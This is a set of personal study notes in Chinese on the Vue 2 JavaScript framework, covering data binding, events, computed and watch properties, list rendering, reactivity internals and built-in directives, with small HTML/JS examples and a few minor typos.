# Vue 2

*Vue是一套用于**构建用户界面**的**渐进式**JavaScript框架*

https://cn.vuejs.org 文档

**渐进式**意味着**自底向上**: 简单应用只需要一个小的核心库, 复杂应用引入各式各样插件库

* **组件化**模式, 提高代码复用率, 易于维护
* **声明式**编码, 编码人员**无需直接操作`DOM`**, 提升开发效率
* **虚拟**`DOM` + `Diff`算法,尽可能**复用**`DOM`

## 壹 Vue数据绑定

### 1.1 安装, 环境

* **开发环境选择`Vue.js`, 生产环境选择`Vue.min.js`**
* 根据控制台提示的信息安装对应浏览器的开发者调试工具`devtools`

### 1.2 new Vue() 创建Vue实例对象以实现动态参数

> const x = new Vue({
> el: css_selection
> })

* `传入对象` 为构建对象, 类似于`axios({url:..})`
  * `el`属性, 选择的元素, **属性值为CSS选择器**, 工作成果作用在此容器内部
  * `data`属性, 给`html`元素提供接口 **属性值为一个对象**
    * `data`属性对象的每一个`key-value`对应着在`html`元素上标记的`动态参数-参数值`, 未来在js中可以通过这个实例对象的一些方法来修改对应动态参数的参数值, 从而影响到真实的`html`元素
    * 在`html`元素上访问这些参数值的方法是`{{参数名}}`

```html
<!-- 通过Vue动态参数的方式输出Hello Vue -->
<div id="root">
    <h1>Hello {{name}}</h1>
</div>
<script>
    new Vue({
        el: "#root",
        data: {
            name: "Vue"
        }
    }); 
</script>
```

**运行过程**

1. 首先程序从上而下执行, 获取到**模版**, 即为包含`{{..}}`的原`html`容器
2. 当执行到`new Vue..`时, 通过构建对象的`el`, 找到相应的**模版**
3. 把**模版**中相应的`{{..}}`替换为`data`中对应参数, 称为**解析**
4. 用**解析后的容器**替换之前的容器, 以绘制到真实页面

**注意**

* 容器和`Vue`实例的关系**一定一一对应**, 多对一和一对多都会产生问题
* 容器中写的`{{..}}`可以使用`js表达式(有返回值的js语句)`, 如`{{Date.now()}}`, 或者**对应Vue实例中的**`data`对象参数, **相应的属性名会被自动对应到对应`Vue`实例的配置对象的`data`属性**
* 真实开发中**只有一个Vue实例, 配合其下的组件使用**
* 更新`data`中属性, `html`中用到这些属性的地方会**自动更新** 

```html
<!-- html中Data属性和js表达式配合使用 -->
<div id="root">
    <h1>Hello {{name.toUpperCase()}}</h1>
</div>
<script>
    const x = new Vue({
        el: "#root",
        data: {
            name: "Vue"
        }
    }); 
</script>
```

### 1.3 v-bind:(\:), {{}} Vue模版语法

*和`vue`配合的`html`称为**模版***

* `{{js表达式(可以包含对应 Vue 实例构建对象的 data 对象参数)}}` 插值语法 **把指定的值放到指定的位置**
* `v-bind:`指令语法 **写在标签属性前, 把标签属性值引号中的语句`作为js表达式执行(可以包含对应 Vue 实例构建对象的 data 对象参数)`** 可以简写为`:`
* **插值语法用于动态化标签体中的内容, 指令语法用于动态化标签的属性(v-bing), 动态化解析标签体的内容(v-...), 绑定事件(v-...)**

```html
<!-- v-bind 动态指定 a标签的 href属性 -->
<div id="root">
    <h1>插值语法</h1>
    <h3>你好, {{name}}</h3>
    <h1>指令语法</h1>
    <a v-bind:href="url">个人网站</a>
</div>
<script>
    new Vue({
        el: "#root",
        data: {
            name: "jack",
            url: "http://galaxies.top"
        }
    })
</script>
```

### 1.4 v-model v-bind 数据绑定

* 单向数据绑定如`v-bind`: 
  * `data的name属性` ---`v-bind:`---> `input.value`
  * `input.value` ---x---> `data的name属性`
  * 即修改`name`属性可以影响`input.value`, 但是修改`input.value`不改变`name`属性
* 双向数据绑定`v-model:`
  *  `data的name属性` ---`v-model:`---> `input.value`
  * `input.value` ---`v-model:`---> `data的name属性`
  * 绑定了`v-model:`的容器属性可以和`data`里的对应数据相互改变
  * 不是所有的容器都可以用`v-model:`, **只能应用在部分表单类元素(输入类元素), 有`value`属性**, **只可以绑定`value`**, `v-model:value`可以简写为`v-model`(*因为默认收集的就是`value`*)



```html
<!-- 体验表单类双向绑定数据 -->
<div id="root">
    单向数据绑定: <input type="text" :value="name">
    双向数据绑定: <input type="text" v-model="name">
</div>
<script>
    new Vue({
        el: "#root",
        data: {
            name: "Galaxy"
        }
    })
</script>
```

### 1.5 v.$mount(); el Vue实例关联模版

* 可以先不在`Vue`配置对象上挂载`el`属性
* 在返回的实例对象调用其对象原型上的方法`v.$mount("#root");`
* 好处是更加灵活, *比如可以定时关联*

```html
<!-- 用 $mount() 关联模版-->
<div id="root">
    <h1>你好, {{name}}</h1>
</div>
<script>
    const v = new Vue({
        data: {
            name: "Galaxy"
        }
    });
    console.log(v);
    v.$mount("#root");
</script>
```

### 1.6 data的函数式写法

* 之前采用的是对象时`data: {key: value..}`
* 可以把`data`写成一个函数 **其返回值是之前的真实需要的对象**
* **必须为一个真实函数!, 不可为箭头函数**, *目的是让`this`指向Vue实例对象*
```js
data(){
    return {
        name: "Galaxy"
    }
}
```
* **在组件开发时, 必须使用函数式**

*对象中的方法无需function*

```html
<!-- 函数式data写法 -->
<div id="root">
    <h1>你好, {{name}}</h1>
</div>
<script>
    const v = new Vue({
        data(){
            return {
                name: "Galaxy"
            }
        }
    });
    console.log(v);
    v.$mount("#root");
</script>
```

### 1.7 Vue中的MVVM

* 数据通过`vm`的一些方法绑定到视图`Dom`
* `Dom`通过`vm`中启动的事件监听器改变数据
* `vm`在中间起到桥梁的作用
* `const vm = new Vue(...)`
* 模版不仅仅能访问到`data`的内容和js表达式, **所有vm实例对象上的成员都可以访问, 包括其对象原型上的所有成员**

```html
<!-- 模版实际能访问vm身上和其对象原型上的所有成员以及js表达式 -->
<div id="root">
    <h1>学校名称: {{name}}</h1>
    <h1>学校地址: {{address}}</h1>
    <h1>test1: {{$options}}</h1>
    <h1>test2: {{$mount}}</h1>
</div>
<script>
    const vm = new Vue({
        el: "#root",
        data(){
            return {
                name: "Galaxies",
                address: "http://www.galaxies.top"
            };
        }
    });
    console.log(vm);
</script>
```

### 1.8 Object.defineProperty() Vue数据代理底层

* 用于给一个对象定义属性
```js
Object.defineProperty(要添加属性的对象, "属性名", {
    value: "属性值"
});
```
* 第三个参数是配置对象
  * `value`属性 指定属性值
  * `enumerable`属性 控制属性是否可以枚举 `true`可以 `false`不可以 **默认**
  * `writable`属性 控制属性是否可以被修改, 默认值`false`
  * `configurable`属性 控制属性是否可以被删除, 默认值`false`
  * `get`**函数配置项`getter`** *可以进行数据绑定, 可以做到: 一个变量发生改变, 某一个对象的属性也发生变化*
    * `get(){}`
    * 当**读取当前设置的属性时进入`get`函数**, 把**返回值作为属性值**, 读出
  * `set`**函数配置项** *不可和`value` `writable`配置项同用*
  * `set(value){}`
  * 当**有人修改当前属性时进入`set属性`, 传入修改的值`value`**
  * 无论是否可以真实修改都会进入, 可能由于绑定了变量, 而变量值未更改, 此时想要真实更改即在`set`内部更改`number`的值, 实现**双向数据绑定**
* 与一般的属性相比, 这种定义的属性可以指定是否可以被枚举, 是否可以修改, 是否可以删除等等

```js
// 通过Object.defineProperty定义的属性如需枚举需要配置
const person = {
    name: "张三",
    sex: "男"
}
Object.defineProperty(person, "age", {
    value: 18,
});
console.log(Object.keys(person)); // name sex
```

```js
// getter 动态绑定对象属性
let number = 18;
const person = {
    name: "张三",
    sex: "男"
};
Object.defineProperty(person, "age", {
    // 当有人读取
    get(){return number}
})
console.log(person.age); // 18
number = 2000;
console.log(person.age); // 19
```

```js
// number 和 person.age 通过 Object.defineProperty 双向绑定
let number = 18;
const person = {
    name: "张三",
    sex: "男"
};
Object.defineProperty(person, "age", {
    get(){return number},      // 通过number可以修改person.age
    set(value){number = value} // 通过person.age可以修改number
})
console.log(person.age); // 18
console.log(number);
person.age = 2000;
console.log(person.age); // 2000
console.log(number);
number = 100;
console.log(person.age); // 100
console.log(number);
```

### 1.9 Vue中的数据代理

*通过一个对象代理对另一个对象中属性的操作 读/写*

```js
// 通过obj2, 代理obj1.x 读, 写
const obj = {x: 100};
const obj2 = {y: 200};
console.log(obj2);
Object.defineProperty(obj2, "x", {
    get(){return obj.x;},
    set(value){obj.x = value;}
})
```

* 在`vm`时, `vm.属性`代理了`data.属性`, 读取修改`vm`的值时, 都是通过`getter`和`setter`读取设置`data.属性的值`
* 修改`data`后, 下一次读取`vm`值, 触发`vm的getter`函数, 读到`data`的新值, 因此看上去`data`的改变引起了`vm`的改变
* 修改`vm`后, 触发`vm的setter`函数, 修改`data`的值, 因此`vm`的修改改变了`data`
* 而无论哪种情况, `data`的值都发生了改变, 因而`DOM`模版自动更新(规则:`data`的改变引起`DOM`自动更新 **data中任何数据变化, 模版会重新解析**)
* *`vm._data`就是`data`*
* *通过`vm`的属性更加方便的操作了`_data`, 因此在模版中只用写`name`, 而不是`_data.nam`*

## 贰 Vue事件

### 2.1 @ 事件监听

* `v-on:事件名="函数名"`简写为`@事件名="函数名"`
* **函数**应在`Vue`实例的**配置对象中**的`methods`属性对象下
* **这个函数可以有一个参数为`事件对象`**, `this`是`vm`
* 给事件回调函数, 传入其他参数 `@事件名="函数名(参数)"`, 不想弄丢事件对象`event`可以`@事件名="函数名($event, 参数)"`
* 最终的函数会出现在`vm`(这是能访问到的原因), 但是不需要做**数据代理**, 因此不放在`data`

```html
<!-- Vue 监听按钮点击事件 -->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <button v-on:click="showinfo">点我提示信息</button>
</div>
<script>
    new Vue({
        el: "#root",
        methods:{
            showinfo(){
                alert("你好, 同学");
            }
        },
        data(){
            return {
                name: "Galaxies"
            };
        },
    })
</script>
```

```html
<!-- 回调函数传入自定义参数 -->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <button v-on:click="showinfo1">点我提示信息</button>
    <button @click="showinfo2($event, name)">点我提示信息</button>
</div>
<script>
    new Vue({
        el: "#root",
        methods:{
            showinfo1(){
                this.name = "http://www.galaxies.top"
            },
            showinfo2(event, number){
                this.name = "Galaxies";
                alert(number);
            }
        },
        data(){
            return {
                name: "Galaxies"
            };
        },
    });
</script>
```

### 2.2 .事件修饰符

* `@事件名.事件修饰符`
* 事件修饰符
  * `.prevent`阻止默认事件 如`<a>`标签的跳转, 相当与`e.preventDefault()` **重点**
  * `.stop`阻止事件冒泡, 相当于`e.stopPropagation()` **重点**
  * `.once`事件只触发一次 **重点**
  * `.capture` 在捕获阶段开始处理事件 *事件处理顺序, 先捕获, 再冒泡, 默认是冒泡时处理事件*
  * `.self` 只有`event.target`是**触发的元素**时才处理事件, *冒泡时多次触发的元素也是同一个, 不会因为冒泡到父元素而使`event.target`变成父元素, 点击(操作)父元素时才会使`event.target`变成父元素`*
  * `passive`事件的默认行为立即执行, 无需等待事件回调函数执行完毕 *默认的顺序是只有回调函数执行完毕, 才会执行默认行为* *a标签似乎用不了? 移动端使用多*
  * 可以连续写, 按照需要的顺序`@keyup.ctrl.y="函数名"`

```html
<!-- .stop 阻止冒泡, 只会在button上触发 -->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <a href="http://www.galaxies.top" @click.prevent="showinfo">点我提示信息</a>
    <div class="demo2" @click="showinfo">
        <div class="demo1" @click="showinfo">
            <button @click.stop="showinfo">点我提示信息</button>
        </div>
    </div>
</div>
<script>
    new Vue({
        el: "#root",
        methods:{
            showinfo(e){
                alert("hi");
            },
        },
        data(){
            return {
                name: "Galaxies"
            };
        },
    });
</script>
```

### 2.3 keyup keydown 键盘事件 别名

* 对于键盘事件, js的`DOM` API需要判断`e.keyCode`来给予指定的按键操作, 比如`13`表示回车 *尽量不要使用编码, 用名称, 编码已停止支持*
* 在`Vue`中, 给予`keydown`, `keyup`事件一些特殊的修饰符表示案件的别名, 只有指定按键才会触发事件
* `@keyup.修饰符`
  * `.enter`回车
  * `.delete` `delete`键 和 `Backspace`退格键都会触发
  * `.esc` `Esc`键
  * `.tab` `Tab`键
  * `.space` 空格键
  * `.up` 上
  * `.down` 下
  * `.left` 左
  * `.right` 右
  * 对于其它`Vue`没有提供特定修饰符的按键, 可以通过`.按键名字`进行事件绑定, 这里的按键名字即为`event.key`的值, 对于多个单词的(多个大写字母), 要把所有单词转换为小写, 然后`-`分割, `cap-lock`

```html
<!-- 给 回车键 绑定事件-->
<div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <input type="text" placeholder="按下回车提示输入" @keyup.enter="showinfo">
</div>
<script>
    new Vue({
        el: "#root",
        methods:{
            showinfo(e){
                console.log(e.key);
            },
        },
        data(){
            return {
                name: "Galaxies"
            };
        },
    });
</script>
```

*`Tab`键不适合`keyup`因为其功能是在键盘按下时切换光标位置, `keydown`绑定*


*`ctrl`, `alt`, `shift`, `meta`(windows键)*
* 配合`keyup`: 按下这些修饰键的同时, 再按下其他键, 随后释放其他键, 事件才会触发
* 配合`keydown`: 正常触发


**给按键添加`Vue`别名**

* `Vue.condig.keyCodes.别名 = 按键编码`(没必要)

## 叁 计算属性和监视属性

### 3.1 computed 计算属性

**属性Property** `data`里的数据

**计算属性** 通过属性的一系列计算, 处理生成的一个全新的属性

* 写在`vm`配置对象的`computed`属性对象中
* 属性值应为一个对象, 内部有`getter函数`, 读取其值的时候, 调用`getter`, 将返回值作为其值
* `getter`中的`this`也被`Vue`调成了`vm`
* 解析时, 会将`计算属性`的值缓存, 只有两个时机, 会通过`getter`读取`计算属性`的值
  * 第一次解析时
  * ***所依赖*的data数据发生更改时**
  * 对比`methods`, `methods`没有缓存, 每一次`data`中任何元素发生变化都会重新**解析**, 而每一次解析都会重新执行模版用到的`methods`中的方法, 而对于`computed`中的属性在每一次解析时, 只要依赖 的`data`属性不变, 就不会调用`getter`
* `setter`的调用时机, 只有尝试修改`计算属性`的值时, 如果想**真实修改`计算属性`的值, 要在`setter`中更改其依赖属性的值, 以便读取时通过`getter`得到**
```html
<!-- 计算属性显示全名 -->
<div id="root">
    <div>姓: <input type="text" v-model="firstName"></div>
    <div>名: <input type="text" v-model="lastName"></div>
    <div>{{fullName}}</div>
</div>
<script>
    new Vue({
        el: "#root",
        data(){
            return {
                firstName: "a",
                lastName: "b"
            }
        },
        computed: {
            fullName: {
                get(){return this.firstName.slice(0, 3)+ "-" + this.lastName;}
            }
        }
    })
</script>
```

### 3.2 只读不改时get简写

* 直接把`computed`中的`计算属性`作为一个函数

```html
<!-- 只读不写时, 计算属性名的函数作为getter -->
<div id="root">
    <div>姓: <input type="text" v-model="firstName"></div>
    <div>名: <input type="text" v-model="lastName"></div>
    <div>全名: {{fullName}}</div>
</div>
<script>
    const vm = new Vue({
        el: "#root",
        data(){
            return {
                firstName: "",
                lastName: "",
            }
        },
        computed: {
            fullName(){
                return this.firstName.slice(0, 3)+ "-" + this.lastName;
            }
        }
    })
</script>
```

### 3.3 watch 监视属性

* 监视`data`中的属性/`computed`中的计算属性 的值发生改变
* 位于`Vue`配置对象中的`watch`属性对象中
* `属性名:{handler(newValue, oldValue){}, immediate}`
* 当`属性`发生改变时, `handler`被调用
  * `newValue` 属性新值
  * `oldValue` 属性旧值
* `immediate`配置项, 默认为`false`, `true`表示, 页面第一次解析时调用一次
* 和`setter`的区分是`setter`直接修改其值才会触发, 而`handler`即使是修改其**依赖属性**, 导致其值发生改变也会触发, 此时不会触发`setter`

```html
<!-- 监视 test 计算属性 -->
<div id="root">
    <h1>今天天气很{{weather}}</h1>
    <button @click="changeWeather">切换天气</button>
</div>
<script>
    new Vue({
        el: "#root",
        data(){
            return {
                weather: "凉爽"
            }
        },
        methods:{
            changeWeather(){
                this.weather = this.weather === "凉爽" ? "炎热" : "凉爽";
            }
        },
        computed:{
            test(){return this.weather}
        },
        watch:{
            test:{
                immediate:true,
                handler(newValue, oldValue){
                    console.log("test被修改", newValue, oldValue);
                }
            } 
        }
    })
</script>
```

### 3.4 $watch 外写监视属性

```js
vm.$watch("属性名", {
    handler(){},
    immediate...
});
```

### 3.5 嵌套数据监视

```js
// 监视属性numbers下的a
new Vue({
    el: "#root",
    data(){
        return {
            weather: "凉爽",
            numbers: {
                a: 1,
                b: 2
            }
        }
    },
    methods:{
        changeWeather(){
            this.weather = this.weather === "凉爽" ? "炎热" : "凉爽";
        }
    },
    watch:{
        weather:{
            immediate:true,
            handler(newValue, oldValue){
                console.log("weather 的 handler 被触发", newValue, oldValue);
            }
        },
        "numbers.a": {
            handler(){
                console.log("a被改变了");
            }
        } 
    }
})
```

### 3.6 deep 深度监视

* 如上节结构, `numbers`属性下有多个自身的属性, 任意一个属性发生变化, 都视作`numbers`发生了变化, *实际上由于numbers是地址始终不变*
* 在需要`watch`的属性配置对象下添加`deep: true`配置项 *默认为`false`*
* *对于数组似乎不起作用*

```html
<!-- 通过 deep 配置 监视到 numbers 下的 各个元素的改变 -->
<div id="root">
    <h1>今天天气很{{weather}}</h1>
    <button @click="changeWeather">切换天气</button>
    <hr>
    <h3>a的值是:{{numbers.a}}</h3>
    <button @click="numbers.a++">点击让a自增</button>
</div>
<script>
    new Vue({
        el: "#root",
        data(){
            return {
                weather: "凉爽",
                numbers: {
                    a: 1,
                    b: 2
                }
            }
        },
        methods:{
            changeWeather(){
                this.weather = this.weather === "凉爽" ? "炎热" : "凉爽";
            }
        },
        watch:{
            weather:{
                immediate:true,
                handler(newValue, oldValue){
                    console.log("weather 的 handler 被触发", newValue, oldValue);
                }
            },
            "numbers": {
                deep: true,
                handler(){
                    console.log("numbers 被改变了");
                }
            } 
        }
    })
</script>
```

### 3.7 简写监视属性

* `watch`的属性的配置对象中只有`handler`, 可以简写

```js
watch:{
    属性名(){
        ...
    }
}
```

这个函数即为之前的`handler`作用

**独立写法**

```js
vm.$watch("属性名", function(){
    ...
})
```

## 肆 动态样式

### 4.1 :class 动态绑定类选择器

* `:class`绑定class动态样式, 
  * **字符串写法**, `:class="style"`*适用于样式的类选择器**名字**不确定, 需要动态指定* 会把字符串添加
  * **数组写法**, `:class="arr"` *适用于样式的类选择器**个数和名字**不确定, 需要动态指定* 会把数组中存在的类选择器名字符串添加
  * **对象写法** `:class="obj"` *适用于样式的类选择器**个数不确定, 但名字确定**, 需要动态指定* 会把对象中`value`为`true`的属性添加
* 对于固定的样式正常写`class`

```html
<!-- 动态类选择器字符串写法 -->
<div class="root">
    <div class="basic" :class="style" @click="changeColor">{{name}}</div>
</div>
<script>
    new Vue({
        el: ".root",
        data() {
            return {
                name: "张三",
                style: "pink",
            };
        },
        methods: {
            changeColor(){
                this.style = this.style === "pink" ? "skyblue" : "pink";
            }
        },
    })
</script>
```

### 4.2 :style="{}" 动态绑定style

* `:style="obj"`
* 要传入对象, 因为对象可以作为`js表达式`
* 对象中写对应属性和值`fontSize: 40 + "px"`
* 对于有`-`的属性, 转换为**驼峰写法**

## 伍 条件渲染 列表渲染

### 5.1 v-if v-show 条件渲染

*满足一些条件渲染页面*

*v-show属性*

* 控制元素的**显示隐藏**
* 值(或计算过的表达式)为`false`隐藏元素
* 底层实现 `display: none;`

**v-if属性**

* 控制元素的**存在与否**
* 值(或计算过的表达式)为`false`**元素消失**

*如果节点变化很频繁, 使用`v-show`控制显示隐藏为宜*

* 配合`v-else-if` 如同语言中的`if..else if..` 比多个`v-if`效率稍高 **不可以被其他元素打断, 和`v-if`连上**
* 配合`v-else`同理, 但是直接写`v-else`, 而非`v-else="条件"`, **不要写条件**
* 配合`<template v-if..></tempalte>`标签, 包裹多个标签进行相同条件判断, 渲染, 而与包裹一个`<div v-if..></div>`不同的是, **最终页面不会显示这个外标签**

```html
<!-- v-show 控制元素隐藏 -->
<div id="root">
    <div v-show="false">{{say}}</div>
</div>
<script>
    new Vue({
        el: "#root",
        data() {
            return {
                say: "Hello",
            }
        },
    })
</script>
```

### 5.2 列表渲染

#### 5.2.1 v-for 循环渲染

* `v-for="i in arr"`
* 用于渲染一些重复元素, 如列表
* `v-for`从数组`arr`取出每一个`i`, 此时这个被重复的元素调用对应`i`中的一些属性方法
* 也可以遍历对象`v-for="(val, key) in obj" :key="key"`, 注意先`val`再`key`

**key属性**

* `:key="i.idf"`
* 用到循环操作, 需要给每个元素打上一个唯一的标识
* 一定要用`:`进行**动态绑定, 且绑定不同数据**
* 也可以这样绑定`:key`: `v-for="(obj, index) in arr" :key="index"` *`v-for`的第二个参数为索引值*

```html
<!-- v-for 遍历数组类型, 循环渲染li -->
<div id="root">
    <ul>
        <li v-for="(p, index) in persons" :key="index">
            {{p.name}}-{{p.age}}
        </li>
    </ul>
</div>
<script>
    new Vue({
        el: "#root",
        data() {
            return {
                persons: [
                    {id:"001", name: "张三", age: 18},
                    {id:"002", name: "李四", age: 19},
                    {id:"003", name: "王五", age: 20},
                ]
            }
        },
    })
</script>
```

#### 5.2.2 key的作用和原理

* 对原始数据的**顺序**进行有破坏的加入删除, 此时再使用`index`作为`:key`会导致**效率低, 数据错乱的问题**, 
* 原由如下: 
  * `:key`是`Vue`判断重绘前后, 两个元素是否为同一个的依据, `data`发生改变时, `Vue`根据数据新数据生成对应的**虚拟DOM**, 由于数据的顺序改变, 部分数据对应的元素的`:key`因`index`变化而变化, `Vue`此时在新生成的**虚拟DOM**, 根据`:key`对应`data`改变前的**虚拟DOM**不正确, 从而导致了`Vue`错误判断了是否应复用节点, 或重新生成, 造成**效率低, 真实DOM中的数据错乱**
  * 如果不写`key`, `Vue`会默认把`index`作为`key`
* 因此最好使用**每条数据的唯一标识作为key值**,但是不存在对数据中的逆序添加, 逆序删除时(*如列表的头插, 中插属于逆序, 而尾插是顺序*), 使用`index`是没有问题的 

#### 案例 利用`v-for`和`computed`进行列表过滤 *模糊搜索*

```html
<div id="root">
    <input type="text" placeholder="请输入名字" v-model="inputValue">
    <ul>
        <li v-for="(p) in computedPersons" :key="p.id">
            {{p.name}}-{{p.age}}-{{p.sex}}
        </li>
    </ul>
</div>
<script>
    const vm = new Vue({
        el: "#root",
        data() {
            return {
                persons: [
                    {id:"001", name: "张四", age: 18, sex: "男"},
                    {id:"002", name: "王四", age: 19, sex: "女"},
                    {id:"003", name: "王五", age: 20, sex: "女"},
                    {id:"004", name: "刘五", age: 20, sex: "男"},
                ],
                inputValue: "",
            }
        },
        computed: {
            computedPersons(){
                return this.persons.filter(d => d.name.includes(this.inputValue));
            },
        },
    })
</script>
```

## 陆 Vue监视数据原理

* *Vue是如何监视到data中元素的改变并以此来重新解析模板, 来更新页面的?*
* *watch又是如何做到可以让我们监视到计算属性的依赖或data属性的变化的?*

### 6.1 Vue的_data的形成 数据劫持

* 事实上, 在我们传入**配置对象**(包含data)之后, `vm._data` = `配置对象.data`之前, 还有一步, 是对`配置对象.data`进行改造, 这个改造的作用就是**可以检测最终`_data`中的数据变化(*并做出重新解析模板的后续动作*), 也就是为所有对象内的数据添加`getter`, `setter`**
* 那么如何让`配置对象.data`中出现`getter setter`, *可以通过object.defineProperty(配置对象.data, 相应属性)直接定义吗, 不可以的, 因为本身data里面已经有这些属性, 这样直接定义会发生递归调用, 出错*
* 真实的情况的借助一个`Observer`的构造函数来完成, 基本原理如下

```js
data = {
    name: "张三",
};

const obs = new Observer(data);
function Observer(data){
    Object.keys(data).forEach(key => {
        Object.defineProperty(this, key, { // 借助 Observer 规避了 getter setter 递归调用
            get(){
                return data[key];
            },
            set(val){
                data[key] = val;
            },
        })
    })
}
const _data = data = obs;
```
* 这种方式称为**数据劫持**
* *Vue采用了更复杂的递归算法, 把所有对象内的数据都添加了`getter&setter`*

### 6.2 Vue.set() 后续添加属性

*在上一小节, 我们了解到, _data中的数据无论藏的多深, `Vue`都会添加对应的`getter`和`setter`, 而当有一些**属性需要我们后续补充**时, 显然直接添加是不可行的, **需要使用`Vue.set()`或`vm.$set()`方法***

* `Vue.set(target, key, val)`
* `target` 要修改的对象, 如想给`_data`中的`student`上添加属性, 可以`vm._data.student`, 由于**数据代理**, `vm.student`也会修改`_data`中的
* `key`新添加的属性名
* `val`新添加的属性值

*局限是不能直接给_data添加属性, 也就是vm身上和其对象_data不能添加新挂载属性*

### 6.3 Vue检测数组数据变化

* *Vue实际上没有为数组内的各个数据添加`getter&setter`, 依次**直接通过索引修改Vue管理的数组数据是不可行的**, `Vue`是对数组中的常用方法进行了包装, 也就是说, 用`push`等方法修改数组元素, 实际上调用的是`Vue`的一些方法*
* 这些包装过的方法包括
  * `push`
  * `pop`
  * `shift`
  * `unshift`
  * `splice`
  * `sort`
  * `reserve`
* 虽然数组中的元素没有添加`getter&setter`, 但如果数组中的元素是一个对象, 这个对象里的数据依旧有`getter&setter`, **所以下标方式`[n]...`不在最后, 依旧可以用下标方式更改*元素的元素***, 同样会引起监视而导致页面更新

```html
<!-- 数据监视的综合案例 -->
<body>
  <div id="root">
    <button @click="student.age++">年龄+ 1 </button>
    <button @click.once="addSex">添加性别属性, 默认值: 男</button>
    <button @click.once="addFriend">在列表首位添加一个朋友</button>
    <button @click.once="fixFriend">修改第一个朋友的名字为: 张三</button>
    <button @click.once="addHobby">添加一个爱好</button>
    <button @click.once="fixHobby">修改第一个爱好为: 开车</button>

    <h3>姓名: {{student.name}}</h3>
    <h3 v-if="student.sex">性别: {{student.sex}}</h3>
    <h3>年龄: {{student.age}}</h3>
    <h3>爱好: </h3>
    <ul>
      <li v-for="h in student.hobby" :key="h">
        {{h}}
      </li>
    </ul>
    <h3>朋友们: </h3>
    <ul>
      <li v-for="f in student.friends" :key="f.id">
        {{f.name}}---{{f.age}}
      </li>
    </ul>
  </div>
  <script>
    const vm = new Vue({
      el: "#root",
      data() {
        return {
          student: {
            name: "Tom",
            age: 18,
            hobby: ["抽烟", "喝酒", "烫头"],
            friends: [
              {name: "Jerry", age: 35, id: "001"},
              {name: "Tony", age: 36, id: "002"},
            ],
          },
        };
      },
      methods: {
        addSex(){
          Vue.set(this.student, "sex", "男");
        },
        addFriend(){
          this.student.friends.unshift({name: "李四", age: 30, id: "003"});
        },
        fixFriend(){
          this.student.friends[0].name = "张三";
        },
        addHobby(){
          this.student.hobby.push("打麻将");
        },
        fixHobby(){
          this.student.hobby.shift();
          this.student.hobby.unshift("开车");
        }
      },
    });
  </script>
</body>
```

## 柒 v-model 收集表单数据

* `v-model` 默认收集输入框的`value`值

**针对不同表单元素的收集**
* 形如`<input type="text">` 则`v-model`绑定的就是文本框中的内容, 即`value`值
* 形如`<input type="radio">` 选择框, 则`v-model`绑定的是`vm`上数据和**选中元素的`value`值, 要手动给选择框添加`value`属性**
* 形如`<input type="checkbox">` 多选框
  * 如果`v-model`绑定的`vm`上的数据为**字符串**, 则默认绑定多选框的`checked`属性, *因此如果多个多选框采取这种数据形式是同步变化的*, **常用于只有一个多选框的情况, 比如*同意用户协议***
  * 如果`v-model`绑定的`vm`上的数据为**数组**, 默认绑定多选框的`value`属性, 需要指定各个多选框的`value`, 数组会存放选中了的`value`
* `v-model`的修饰符
  * `lazy`失去焦点后再收集数据
  * `number` 输入字符串转为有效的数字(否则默认转成字符串) *常和`<input type="number">`配合*
  * `trim`收集到的数据首尾空格过滤

```html
<!-- 常用表单的内容收集 -->
<body>
  <div id="root">
    <form>
      账号: <input type="text" v-model="account"> <br/><br/>
      密码: <input type="password" v-model="password"> <br/><br/>
      性别: 
      男 <input type="radio" name="sex">
      女 <input type="radio" name="sex"> <br/><br/>
      爱好:
      学习 <input type="checkbox">
      打游戏 <input type="checkbox">
      吃饭 <input type="checkbox"> <br/><br/>
      所属校区:
      <select>
        <option value="">请选择校区</option>
        <option value="beijing">北京</option>
        <option value="shanghai">上海</option>
        <option value="shenzhen">深圳</option>
        <option value="wuhan">武汉</option>
      </select> <br/><br/>
      其它信息:
      <textarea></textarea> <br/><br/>
      <input type="checkbox"> 阅读并接受
      <a href="http://galaxies.top">《用户协议》</a> <br/><br/>
      <button>提交</button>
    </form>
  </div>
  <script>
    const vm = new Vue({
      el: "#root",
      data() {
        return {
          account: "", // 存储账号
          password: "", // 密码 
        }
      },
    })
  </script>
</body>
```

## filter 过滤器

* 对要显示的数据进行特定格式化后再显示 *适用于简单的处理, 多个不同数据同样的方法来过滤*
* 全局过滤器
  * `Vue.filter(name, callback)`
  * `name`过滤器名
  * `callback`相当于局部过滤器自身的函数, 返回值作为过滤后的结果
  * 多个`vm`实例(*组件*)的数据进行过滤
* 局部过滤器
  * `vm`下`filters`属性中, `过滤器名(val, others){return ..}`
  * `val` 要过滤传入的数据
  * `others` 其它数据, 可以在过滤时传入
  * 返回值作为过滤后的结果
* 使用过滤器
 * `{{xxx | 过滤器}}`或`{{xxx | 过滤器(others)}}`
 * 也可以在`v-bind`中使用
 * 支持多个过滤器串联

```html
<body>
  <!-- 过滤器的几种使用 -->
  <div id="root">
    <h2>显示格式化后的时间</h2>
    <!-- 计算属性 -->
    <h3>现在是: {{fmtTime}}</h3>
    <!-- 过滤器 -->
    <h3>现在是: {{time | timeFormater}}</h3>
    <!-- 传入参数的过滤器 -->
    <h3>现在是: {{time | timeFormater("YYYY_MM_DD")}}</h3>
    <!-- 过滤器串联 -->
    <h3>现在是: {{time | timeFormater("YYYY_MM_DD") | mySlice}}</h3>
  </div>
  <script>
    const vm = new Vue({
      el: "#root",
      data() {
        return {
          time: Date.now(),
        }
      },
      computed: {
        fmtTime(){
          return dayjs(this.time).format("YYYY-MM-DD HH:mm:ss");
        }
      },
      filters: {
        timeFormater(time, str = "YYYY-MM-DD HH:mm:ss"){
          return dayjs(time).format(str);
        },
        mySlice(val){
          return val.slice(0, 4)
        }
      },
    });
  </script>
</body>
```

## 捌 内置指令

### 8.1 v-text 向其所在节点中渲染文本内容

* 会替换掉节点中的内容
* 不如插值语法`{{}}`灵活
* 不会解析标签 *和插值语法一样*

```html
<body>
  <div id="root">
    <div>{{name}}</div>
    <div v-text="name"></div>
    <div>{{html}}</div>
    <div v-text="html"></div>
  </div>
  <script>
    new Vue({
      el: "#root",
      data() {
        return {
          name: "张三",
          html: "<h3>你好啊</h3>"
        };
      },
    })
  </script>
</body>
```

### 8.2 v-html 向其所在节点中渲染包含html结构的内容

* 和`v-text`的使用类似
* 向指定节点中渲染**包含html结构**的内容
